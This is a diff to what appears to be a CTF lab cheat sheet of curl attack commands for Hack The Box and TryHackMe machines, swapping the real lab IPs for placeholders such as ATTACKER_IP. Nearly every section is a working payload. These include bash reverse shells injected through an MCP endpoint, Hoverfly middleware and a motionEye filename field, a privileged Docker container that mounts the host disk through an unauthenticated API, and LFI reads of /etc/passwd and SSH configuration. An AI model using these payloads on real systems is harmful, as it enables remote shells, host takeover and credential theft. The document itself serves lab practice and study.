@@ -16,7 +16,7 @@ Used on: **Kobold** — exploits unsanitized `command` / `args` in an MCP endpoi
 ```bash
 curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
   -H "Content-Type: application/json" \
-  -d '{"serverConfig":{"command":"/bin/bash","args":["-c","bash -i >& /dev/tcp/10.10.14.178/4444 0>&1"],"env":{}},"serverId":"revshell"}'
+  -d '{"serverConfig":{"command":"/bin/bash","args":["-c","bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"],"env":{}},"serverId":"revshell"}'
 ```
 Used on: **Kobold**
 
@@ -51,7 +51,7 @@ Used on: **DevArea**
 curl -s -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
-  -d '{"binary":"bash","script":"#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.178/4444 0>&1"}'
+  -d '{"binary":"bash","script":"#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"}'
 ```
 Used on: **DevArea**
 
@@ -64,7 +64,7 @@ Used on: **DevArea**
 ### motionEye config injection through API
 ```bash
 curl "http://127.0.0.1:7999/1/config/set?picture_output=on"
-curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(bash -c 'bash -i >& /dev/tcp/10.10.14.91/4444 0>&1')"
+curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')"
 curl "http://127.0.0.1:7999/1/config/set?emulate_motion=on"
 ```
 Used on: **CCTV**
@@ -80,16 +80,33 @@ Used on: **Silentium**
 
 ### Unauthenticated Docker API abuse
 ```bash
-curl http://192.168.65.7:2375/version
-curl http://192.168.65.7:2375/containers/json
+curl http://DOCKER_HOST_IP:2375/version
+curl http://DOCKER_HOST_IP:2375/containers/json
 
 curl -X POST -H "Content-Type: application/json" \
-  http://192.168.65.7:2375/containers/create?name=pwned \
+  http://DOCKER_HOST_IP:2375/containers/create?name=pwned \
   -d '{"Image":"alpine:latest","Cmd":["sleep","infinity"],"HostConfig":{"Privileged":true,"Binds":["/mnt/host/c/:/mnt/windows"]}}'
 
-curl -X POST http://192.168.65.7:2375/containers/pwned/start
+curl -X POST http://DOCKER_HOST_IP:2375/containers/pwned/start
 ```
 Used on: **MonitorsFour**
+
+### LFI — read arbitrary files through a PHP page parameter
+```bash
+curl "http://dev.team.thm/script.php?page=/etc/passwd"
+curl "http://dev.team.thm/script.php?page=/etc/vsftpd.conf"
+curl "http://dev.team.thm/script.php?page=/etc/ssh/sshd_config"
+```
+Used on: **Team** — `page` parameter passes input unsanitized to `include()`.
+
+### Codiad authentication (obtain session cookie)
+```bash
+curl -k -i 'http://TARGET_IP/codiad/components/user/controller.php?action=authenticate' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-raw 'username=john&password=password&theme=default&language=en' \
+  -c cookies.txt
+```
+Used on: **IDE** — first step before triggering CVE-2018-14009.
 
 ### SOAP command injection (Windows)
 ```bash
